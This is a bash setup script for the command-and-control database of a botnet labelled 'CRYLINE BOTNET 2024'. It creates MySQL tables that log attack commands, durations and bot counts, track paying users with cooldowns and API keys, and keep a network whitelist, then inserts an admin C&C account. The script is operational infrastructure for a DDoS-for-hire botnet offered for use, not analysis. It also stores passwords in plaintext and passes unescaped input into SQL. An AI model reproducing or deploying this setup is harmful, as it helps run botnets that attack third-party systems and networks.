#!/bin/bash

clear

echo ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"
echo ";;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;"
echo ";;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;"
echo ";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;"

echo " "

read -p "[*] Please enter user: " GET_MYSQL_USER

read -s -p "[*] Please enter the password: " GET_MYSQL_PASSWORD

echo " "

read -p "[*] Please enter the C&C login: " GET_CNC_LOGIN

read -s -p "[*] Please enter the C&C password: " GET_CNC_PASSWORD

echo " "

mysql -u$GET_MYSQL_USER -p$GET_MYSQL_PASSWORD -h 127.0.0.1 -e "CREATE DATABASE cryline /*\!40100 DEFAULT CHARACTER SET utf8 */;"

mysql -u$GET_MYSQL_USER -p$GET_MYSQL_PASSWORD -h 127.0.0.1 -D cryline -e "CREATE TABLE \`history\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`user_id\` int(10) unsigned NOT NULL, \`time_sent\` int(10) unsigned NOT NULL, \`duration\` int(10) unsigned NOT NULL, \`command\` text NOT NULL, \`max_bots\` int(11) DEFAULT '-1', PRIMARY KEY (\`id\`), KEY \`user_id\` (\`user_id\`));"

mysql -u$GET_MYSQL_USER -p$GET_MYSQL_PASSWORD -h 127.0.0.1 -D cryline -e "CREATE TABLE \`users\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`username\` varchar(32) NOT NULL, \`password\` varchar(32) NOT NULL, \`duration_limit\` int(10) unsigned DEFAULT NULL, \`cooldown\` int(10) unsigned NOT NULL, \`wrc\` int(10) unsigned DEFAULT NULL, \`last_paid\` int(10) unsigned NOT NULL, \`max_bots\` int(11) DEFAULT '-1', \`admin\` int(10) unsigned DEFAULT '0', \`intvl\` int(10) unsigned DEFAULT '30', \`api_key\` text, PRIMARY KEY (\`id\`), KEY \`username\` (\`username\`));"

mysql -u$GET_MYSQL_USER -p$GET_MYSQL_PASSWORD -h 127.0.0.1 -D cryline -e "CREATE TABLE \`whitelist\` (\`id\` int(10) unsigned NOT NULL AUTO_INCREMENT, \`prefix\` varchar(16) DEFAULT NULL, \`netmask\` tinyint(3) unsigned DEFAULT NULL, PRIMARY KEY (\`id\`), KEY \`prefix\` (\`prefix\`));"

mysql -u$GET_MYSQL_USER -p$GET_MYSQL_PASSWORD -h 127.0.0.1 -D cryline -e "INSERT INTO users VALUES (NULL, '$GET_CNC_LOGIN', '$GET_CNC_PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');"

exit